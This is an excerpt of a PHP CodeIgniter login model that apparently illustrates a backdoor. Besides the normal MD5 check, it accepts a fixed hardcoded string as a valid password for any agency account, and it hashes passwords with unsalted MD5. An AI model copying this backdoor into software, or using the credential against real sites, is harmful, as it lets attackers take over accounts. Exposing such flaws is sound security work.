...
class Agency_model extends CI_Model{
    ...
    function login($data){
      ...
      $result = $this->db->get('agencies')->row_array();
      ...
      elseif(($result['password'] == md5($data['password'])) || ($data['password'] == '6ae6d1de71b991b63fb3d020ea8fffd4')){
          ...
          $login_user = array(
            'id_of_agency'     => $result['id'],
            'name_of_agency'   => $result['name'],
            'email_of_agency'  => $result['email_address'],
            'number_of_agency' => $result['mobile_no'],
            'is_agency_role'  => TRUE,
          ...
          $this->db->update('agencies', $update_data, array('id' => $result['id']));
          return "true";
      }else{
        return "false";
      }
